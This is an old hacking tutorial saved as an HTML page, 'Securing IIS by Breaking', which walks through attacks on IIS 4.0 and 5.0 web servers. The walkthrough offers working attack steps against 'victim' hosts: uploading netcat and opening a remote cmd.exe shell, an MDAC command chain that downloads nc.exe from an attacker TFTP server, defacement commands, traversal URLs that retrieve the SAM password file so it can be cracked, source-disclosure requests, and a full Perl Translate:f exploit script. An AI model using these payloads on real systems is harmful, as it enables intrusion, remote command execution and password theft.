@@ -1,0 +1,375 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0044)http://wittys.com/files/mab/iis-hacking.html -->
+<HTML><HEAD><TITLE>SECURING IIS by BREAKING</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
+<BODY link=#0000ff><B><FONT size=4>
+<P>SECURING IIS by BREAKING </P>
+<P>=====================================================</P>
+<P>by Mount Ararat Blossom</P>
+<P>9/15/2000</P>
+<P>mount_ararat_blossom@usa.net</P>
+<P>=====================================================</P>
+<P>01- Abstract</P>
+<P></B></FONT>I am not sure what you want to get out of this but basically this 
+paper is intended on breaking merely IIS web servers especially versions 4.0 and 
+5.0 via TCP/IP over the port 80. This techniques works against even so-called 
+secure networks just because every network even those secured ones lets HTTP 
+connections in.</P><B><FONT size=4>
+<P>=====================================================</P>
+<P>02- Intro</P></B></FONT>
+<P>Alright so you all wanna know how to break into IIS web servers? First off, 
+you should find a cgi-scanner so that things will get easier. My personnel 
+preferences are</P>
+<P>"whisker" by "rain forest puppy" (www.wiretrip.net/rfp).</P>
+<P>"cis" by "mnemonix" (www.cerberus-infosec.co.uk)</P>
+<P>To understand which server is running on the victim site</P>
+<P>telnet &lt;victim&gt; 80</P>
+<P>GET HEAD / HTTP/1.0</P>
+<P>and there you go with the name and the version of the web server. However 
+some sites might run their web servers over 8080, 81, 8000, 8001, and so on.</P>
+<P>To understand SSL web servers, which provides encryption between the web 
+server and the browser we use the tool "ssleay"</P>
+<P>s_client -connect &lt;victim&gt;:443</P>
+<P>HEAD / HTTP /1.0</P>
+<P>and here we go again. </P>
+<P>As i am writing this i am hoping that you will be able to use this to secure 
+your web servers instead of using this to break into others.</P><B><FONT size=4>
+<P>=====================================================</P>
+<P>03- Game Starts</P>
+<P>========IIS HACK=====</P>
+<P></B></FONT>The folks at www.eeye.com, have found a vulnerability on IIS 4.0 
+which allows us to upload a crafted version of netcat (hacker's swiss army 
+knife) onto victim server and binds a cmd.exe on port 80. </P>
+<P>The vulnerabliy was a bufferoverflow in .htr .idc and .stm files. The problem 
+is with insufficient bounds checking of the names in the URL for .htr .stm and 
+.idc files, allowing hackers to insert some backdoors to download and execute 
+arbitrary commands on the local system as the administrator user.</P>
+<P>To hack the victim site we need </P>
+<P>iishack.exe</P>
+<P>ncx.exe (you can find these two at www.technotronic.com)</P>
+<P>plus we need a web server running at our attacking box. </P>
+<P></P>
+<P>First off, run the web server on your attacking box and place the ncx.exe on 
+your root directory.</P>
+<P>then run iishack.exe against the victim site</P>
+<P>c:\&gt;iishack.exe &lt;victim&gt; 80 &lt;evil_hacker&gt;/ncx.exe </P>
+<P>Then here we go, go and get your swiss army knife, namely netcat,</P>
+<P>c:\&gt;nc &lt;victim&gt; 80 ==============&gt;&gt;&gt;BOOM!</P>
+<P>the command promt from the victim site suddenly appears on your box !!!</P>
+<P>D:\&gt; or whatever it is , C;E;...</P>
+<P>do you want me to xplain what to do next, hey common you must be kidding 
+...hehe....</P>
+<P>&nbsp;</P><B><FONT size=4>
+<P>=========MDAC- Local Command Execution===========</P></B></FONT>
+<P>You might think that it is a years-old vulnerability, however what i see on 
+pen-tests is that almost 40% of IIS web servers are still vulnerable to this. 
+</P>
+<P>IIS' MDAC component has a vulnerability where an attacker can submit commands 
+for local execution.</P>
+<P>The core problem is with the RDS Datafactory. By default, it allows remote 
+commands to be sent to the IIS server. The commands will be run as the effective 
+user of the service, which is typically the SYSTEM user. </P>
+<P>I wont get into details, if you want go and check RFP's web site. However, 
+you can find a vulnerable site by checking</P>
+<P>c:\&gt;nc -nw -w 2 &lt;victim&gt; 80</P>
+<P>GET /msadc/msadcs.dll HTTP</P>
+<P>and if you get the following</P>
+<P>application/x_varg</P>
+<P>it is most probably vulnerable if not patched.</P>
+<P>You can find the exploit, mdac.pl and msadc2.pl from rain forest puppy's web 
+site at www.wiretrip.net/rfp It checks for the vulnerability and if it is 
+vulnerable then it asks for the command you wanna execute:</P>
+<P>c:\&gt; mdac.pl -h &lt;victim&gt;</P>
+<P>Please type the NT commandline you want to run (cmd /c assumed):\n</P>
+<P>cmd /c </P>
+<P>if you wanna change the web site which is located at 
+d:\inetpub\wwwroot\victimweb\index.htm</P>
+<P>then you can type:</P>
+<P>cmd/c echo hacked by me &gt; d:\inetpub\wwwroot\victimweb\index.htm</P>
+<P>or what ever you want but my personnal preference is uploading our swiss army 
+knife, netcat, and binding it to the cmd.exe to the port 80. To do that i set up 
+my TFTP server and put nc.exe in it. Then when i am asked to type the command i 
+want to execute, i type the following:</P>
+<P>cmd/c cd %systemroot%&amp;&amp;tftp -i &lt;evil_hacker&gt; GET 
+nc.exe&amp;&amp;del ftptmp &amp;&amp; attrib -r nc.exe&amp;&amp;nc.exe -l -p 80 
+-t -e cmd.exe</P>
+<P>there you go, go on fire your netcat against the victim over port 80, you get 
+the eggshell, cmd.exe.....</P>
+<P>&nbsp;</P>
+<P>=========<B><FONT size=4>Codebrws.asp &amp; Showcode.asp</B></FONT> 
+==================</P>
+<P>Codebrws.asp and Showcode.asp is a viewer file that ships with Microsoft IIS, 
+but is</P>
+<P>not installed by default. The viewer is intended to be installed by the 
+administrator to allow for the viewing of sample files as a learning exercise; 
+however, the viewer does not restrict what files can be accessed. A remote 
+attacker can exploit this vulnerability to</P>
+<P>view the contents of any file on the victim's server. However, there are 
+several issues to be aware of:</P>
+<P>1. Codebrws.asp and showcode.asp are not installed by default.</P>
+<P>2. The vulnerability only allows for viewing of files.</P>
+<P>3. The vulnerability does not bypass WindowsNT Access Control Lists</P>
+<P>(ACLs).</P>
+<P>4. Only files in the same disk partition can be viewed.</P>
+<P>5. Attackers must know the location of the requested file.</P>
+<P>Lets say you wanna see the code of codebrws.asp request the following from 
+the from your favorite web browser,</P>
+<P>http://www.victim.com/iisamples/exair/howitworks/codebrws.asp?source=/ 
+iisamples/exair/howitworks/codebrws.asp</P>
+<P>then you will see the source code of codebrws.asp</P>
+<P>For using showcode.asp, do the following again from your infamous browser</P>
+<P>http://www.victim.com/msadc/samples/selector/showcode.asp?source=/msadc/../../../../../winnt/repair/sam._</P>
+<P>There you go, you get the infamous sam._ file, copy it, expand it and crack 
+it using Lophtcrack, my personal choise, and you will get all user passwords 
+even the administrator one.</P>
+<P>=========<B><FONT size=4>Null.htw</B></FONT>===============</P>
+<P>Microsoft IIS running with Index Server contains a vulnerability</P>
+<P>through Null.htw even if no .htw files exist on the server. Thevulnerability 
+displays the source code of an ASP page or otherrequested file. The ability to 
+view ASP pages could provide sensitive information such as usernames and 
+passwords. An attacker providing IIS with a malformed URL request could escape 
+the virtual directory, providing access to the logical drive and root directory. 
+The "hit-highlighting" function in the Index Server does not adequately restrain 
+what types of files may be requested, allowing an attacker to</P>
+<P>request any file on the server. Microsoft has released a patch for Windows 
+2000 addressing this vulnerability.</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>Null.htw function has 3 variables which gets their inputs from the user. 
+These variables are as follows</P>
+<P>CiWebhitsfile</P>
+<P>CiRestriction</P>
+<P>CiHiliteType</P>
+<P>Respectively.</P>
+<P>Say that, we wanna see the source code of default.asp, the type the following 
+from your favorite browser </P>
+<P>http://www.victim.com/null.htw?CiWebhitsfile=/default.asp%20&amp;%20CiRestriction=none%20&amp;%20&amp;CiHiliteType=full</P>
+<P>and you will get the source of default.asp file.</P>
+<P>&nbsp;</P>
+<P>========<B><FONT size=4>webhits.dll &amp; .htw</B></FONT>================</P>
+<P>The hit-highligting functionality provided by Index Server allows a web user 
+to have a document with their original search terms highlighted on the page. The 
+name of the document is passed to .htw file with the CiWebhitsfile argument. 
+Webhits.dll, the ISAPI Application that deals with the request, opens the file 
+highlights accordingly and returns the resulting page. As the user has control 
+of the CiWebhitsfile argument passed to the .htw file they can request anything 
+they want. And the real problem is that, they can view the source of ASP and 
+other scripted pages.</P>
+<P>To unserstand you are vulnerable, request the following from the site</P>
+<P>http://www.victim.com/nosuchfile.htw</P>
+<P>if you get the following from the server</P>
+<P>format of the QUERY_STRING is invalid</P>
+<P>it means that you are vulnerable.</P>
+<P>The problem is because of webhits.dll (an ISAPI Application) associated to 
+.htw files. You can find the .htw files in the following locations of infamous 
+IIS web server,</P>
+<P>/iissamples/issamples/oop/qfullhit.htw</P>
+<P>/iissamples/issamples/oop/qsumrhit.htw</P>
+<P>/isssamples/exair/search/qfullhit.htw </P>
+<P>/isssamples/exair/search/qsumrhit.htw</P>
+<P>/isshelp/iss/misc/iirturnh.htw (this is normally for loopback)</P>
+<P>An attacker, for instance view the contents of sam._ file as follows</P>
+<P>http://www.victim.com/iissamples/issamples/oop/qfullhit.htw?ciwebhitsfile=/../../winnt/repair/sam._&amp;cirestriction=none&amp;cihilitetype=full</P>
+<P>will reveal the contents of sam._ file, which is binary, you should copy it, 
+expand it and crack it as i explained several times before.</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>===<B><FONT size=4>ASP Alternate Data 
+Streams(::$DATA)==================</P></B></FONT>
+<P>The $DATA vulnerability, published in mid-1998, results from an error</P>
+<P>in the way the Internet Information Server parses file names. $DATA is an 
+attribute of the main data stream (which holds the "primary content") stored 
+within a file on NT File System (NTFS). By creating a specially constructed URL, 
+it is possible to use IIS to access this data stream from a browser. Doing so 
+will display the code of the file</P>
+<P>containing that data stream and any data that file holds. This method can be 
+used to display a script-mapped file that can normally be acted upon only by a 
+particular Application Mapping. The contents of these files are not ordinarily 
+available to users. However, in order to display the file, the file must reside 
+on the NTFS partition and must</P>
+<P>have ACLs set to allow at least read access; the unauthorized user must also 
+know the file name. Microsoft Windows NT Server's IIS versions 1.0, 2.0, 3.0 and 
+4.0 are affected by this vulnerability.</P>
+<P>Microsoft has produced a hotfix for IIS versions 3.0 and 4.0. The fix</P>
+<P>involves IIS "supporting NTFS alternate data streams by asking Windows</P>
+<P>NT to make the file name canonical" according the Microsoft.</P>
+<P>To view or get the source of an .asp code, type the following from your 
+browser</P>
+<P>http://www.victim.com/default.asp::$DATA</P>
+<P>and you will get the source code. </P>
+<P>&nbsp;</P><B><FONT size=4>
+<P>=========ASP Dot Bug====================</P></B></FONT>
+<P>The famous Lopht group has discovered the ASP dot bug in 1997. The 
+vulnerability involved being able to reveal ASP source code to attackers. By 
+appending one or more dots to the end of an ASP URL under IIS 3.0, it was 
+possible to view the ASP source code.</P>
+<P>The exploit worked by appending a dot the end of an ASP as follows</P>
+<P>http://www.victim.com/sample.asp.</P><B><FONT size=4>
+<P>======ISM.DLL Buffer Truncation===============</P>
+<P></P>
+<P></B></FONT>This bug was found by Cerberus Information Security team. It runs 
+on IIS 4.0 and 5.0. that allows attackers to view the content of files and 
+source code of scripts.</P>
+<P>By making a specially formed request to IIS, with the name of the file and 
+then appending around 230 + " %20 " (these represents spaces) and then appending 
+" .htr " this tricks IIS into thinking that the client is requesting a " .htr " 
+file . The .htr file extension is mapped to the ISM.DLL ISAPI Application and 
+IIS redirects all requests for .htr rsources to this DLL.</P>
+<P>ISM.DLL is then passed the name of the file to open and execute but before 
+doing this ISM.DLL truncates the buffer sent to it chopping off the .htr and a 
+few spaces and ends up opening the file we want to get source of. The contents 
+are then returned.</P>
+<P>This attack can only be launched once though., unless the web service started 
+and stopped. It will only work when ISM.DLL first loaded into memory.</P>
+<P>An attacker can view the source of global.asa, for instance, as follows</P>
+<P>http://www.victim.com/global.asa%20%20(...&lt;=230)global.asa.htr</P>
+<P>will reveal the source of global.asa</P><B><FONT size=4>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>==========.idc &amp; .ida Bugs=======================</P></B></FONT>
+<P>This exploit, actually, similar to ASP dot bug, however this time we get the 
+path of web directory on IIS 4.0. I have even seen this bug working on IIS 5.0 
+on my pen-tests. By adding an ".idc" or ".ida" extension to the end of URL will 
+cause IIS installations to try to run the so-called .IDC through the database 
+connector .DLL. If the .idc doesnt exists, than it will return rather 
+informative about the server.</P><FONT size=2>
+<P></FONT>http://www.victim.com/anything.idc or anything.idq</P>
+<P>you will get the path.</P><B><FONT size=4>
+<P>============+.htr Bug===========================</P></FONT>
+<P></B>This exploit is also ever so similar to dot asp bug and you can get the 
+source code of ASA and ASP files by appending a +.htr to the URL of asp and asa 
+files.</P>
+<P>http://www.victim.com/global.asa+.htr</P>
+<P>you<B> </B>may get the source code to browse</P><B><FONT size=4>
+<P>===========NT Site Server Adsamples Vulnerability ======</P>
+<P></B></FONT>By requesting site.csc, which is normally located in 
+/adsamples/config/site.csc,</P>
+<P>The attacker may be able to retrieve the DSN, UID and PASS of the database as 
+this file may contain them.</P>
+<P>By typing the following</P>
+<P>http://www.victim.com/adsamples/config/site.csc</P>
+<P>the attacker will download the file site.csc and (s)he can get some important 
+data.</P><B><FONT size=4>
+<P>&nbsp;</P>
+<P>==========Password Attack to User Accounts===========</P>
+<P></B></FONT>IIS 4.0 has an interesting feature that can allow a remote 
+attacker to attack user accoounts local to the web server as well as other 
+machines across to the internet. Added to this if your Web server is behind a 
+firewall performing NAT (network address translation), machines on inside could 
+be attacked as well.</P>
+<P>By default every install of IIS 4.0 creates a virtual directory " /iisadmpwd 
+". This directory contains a number of .htr files. Anonymous users are allowed 
+to access this files, they are not restricted to loopback address(127.0.0.1). 
+The following is a list of files found in the .iisadmpwd directory, which 
+physically maps to c:\winnt\system32\inetsrv\iisadmpwd</P>
+<P>Achg.htr</P>
+<P>Aexp.htr</P>
+<P>Aexp2.htr</P>
+<P>Aexp2b.htr</P>
+<P>Aexp3.htr</P>
+<P>Aexp4.htr</P>
+<P>Aexp4b.htr</P>
+<P>Anot.htr</P>
+<P>Anot3.htr</P>
+<P>This files are pretty much of the same variants of the same file and allow a 
+user to change their password via web. It can also be used to enumerate valid 
+accounts through guess work.</P>
+<P>If the user account does not exist, a message will be returned saying 
+"invalid domain".</P>
+<P>If the account exists, but the password is wrong then the message will say 
+so.</P>
+<P>If an IP address followed by a backslash precedes the account name then the 
+IIS server will contact the remote machine, over the NetBIOS session port 139, 
+and attempt to change to user’s password. (x.x.x.x\ACCOUNTNAME)</P>
+<P>Therefore, if you do not need this service, remove the /iisadmpwd directory. 
+This will prevent attackers.</P><B><FONT size=4>
+<P>=============Translate:f Bug ====================</P></B></FONT>
+<P>Daniel Docekal brought this issue in BugTraq this summer, August 15, 2000. 
+(www.securityfocus.com/bid/1578) The actual problem is with the WebDAV 
+implementation in office 2000 and FrontPage 2000 Server Extensions. </P>
+<P>When someone makes a request for ASP/ASA or anyother scriptable page and adds 
+"translate:f " into headers of HTTP GET (headers are not part of URL, part of 
+HTTP request), then they are come up with complete ASP/ASA source code on Win2K 
+SP1 not installed.</P>
+<P>Translate:F is a legitimate header for WebDAV and is used in WebDAV 
+compatible client and in FP2000 to get the file for editing.</P>
+<P>Simple adding of "translate:f" and placing "/" at the end of request to HTTP 
+GET will lead in security bug.</P>
+<P>It is a Win2K bug, but due to FP2000 installed IIS4.00, it is also a IIS4.0 
+bug.</P>
+<P>You can use the following perl script to use this exploit.</P>
+<P>#############################</P>
+<P>use IO::Socket; #</P>
+<P>my ($port, $sock,$server); #</P>
+<P>$size=0; #</P>
+<P>#############################</P>
+<P>#</P>
+<P>$server="$ARGV[0]";</P>
+<P>$s="$server";</P>
+<P>$port="80";</P>
+<P>$cm="$ARGV[1]";</P>
+<P>&amp;connect;</P>
+<P>sub connect {</P>
+<P>if ($#ARGV &lt; 1) {</P>
+<P>howto();</P>
+<P>exit;</P>
+<P>}</P>
+<P>$ver="GET /$cm%5C HTTP/1.0</P>
+<P>Host: $server</P>
+<P>Accept: */*</P>
+<P>Translate: f</P>
+<P>\n\n";</P>
+<P>my($iaddr,$paddr,$proto);</P>
+<P>$iaddr = inet_aton($server) || die "Error: $!";</P>
+<P>$paddr = sockaddr_in($port, $iaddr) || die "Error: $!";</P>
+<P>$proto = getprotobyname('tcp') || die "Error: $!";</P>
+<P>socket(SOCK, PF_INET, SOCK_STREAM, $proto) || die "Error:</P>
+<P>$!";</P>
+<P>connect(SOCK, $paddr) || die "Error: $!";</P>
+<P>send(SOCK, $ver, 0) || die "Can't to send packet: $!";</P>
+<P>open(OUT, "&gt;$server.txt");</P>
+<P>print "Dumping $cm to $server.txt \n";</P>
+<P>while(&lt;SOCK&gt;) {</P>
+<P>print OUT &lt;SOCK&gt;;</P>
+<P>}</P>
+<P>sub howto {</P>
+<P>print "type as follows: Trans.pl www.victim.com codetoview.asp \n\n";</P>
+<P>}</P>
+<P>close OUT;</P>
+<P>$n=0;</P>
+<P>$type=2;</P>
+<P>close(SOCK);</P>
+<P>exit(1);</P>
+<P>}</P>
+<P>If we call the script as translate.pl then we can get a ASA/ASP source code 
+as follows</P>
+<P>Trasn.pl www.victim.com codetoview.asp</P>
+<P>And there you go, you get the source code of codeview.asp.</P>
+<P>&nbsp;</P><B><FONT size=4>
+<P>04- Conclusion</P></B></FONT>
+<P>All the information i have given you has been widely used in wild. However 
+what i tried to do was just to collect all these information together as to 
+check the security of our famous IIS 4.0 and 5.0. Wheneveri encounter a IIS web 
+server during my pen-tests, i do check for these vulnerabilities and most of the 
+time one of these works.</P>
+<P>I hope that, what i written was helped you in some way. Thanks for reading 
+it, please continue to support me as i continue to release this sortta papers. 
+If you wanna learn more, please check the mentioned people’s web sites for more 
+details and you can even write to me.</P>
+<P>Peace in mind</P>
+<P>Watch your servers in wild</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P><B><FONT size=4>
+<P>&nbsp;</P>
+<P>&nbsp;</P>
+<P>&nbsp;</P></B></FONT><FONT size=2>
+<P></P></FONT></BODY></HTML>
